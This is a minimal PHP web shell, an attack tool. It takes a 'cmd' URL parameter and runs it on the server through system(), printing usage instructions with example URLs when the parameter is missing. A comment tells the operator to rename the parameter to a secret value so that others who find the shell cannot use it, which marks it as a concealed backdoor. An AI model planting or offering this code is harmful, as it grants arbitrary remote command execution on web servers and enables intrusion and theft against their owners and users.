<html>
<pre>
<?php

if (empty($_GET['cmd'])) //I recommend change the parameter to a random number, a number that only you know. Example: If another person finds the shell, they cant use it.
{

echo "How to use...." . PHP_EOL;
echo "http://127.0.0.1/shell.php?cmd=comamndhere" . PHP_EOL;
echo "Example: " . PHP_EOL;
echo "http://127.0.0.1/shell.php?cmd=ls -la" . PHP_EOL;
  
}
  
else
  
{
  
system($_GET['cmd']);

}

?>
</pre>
</html>
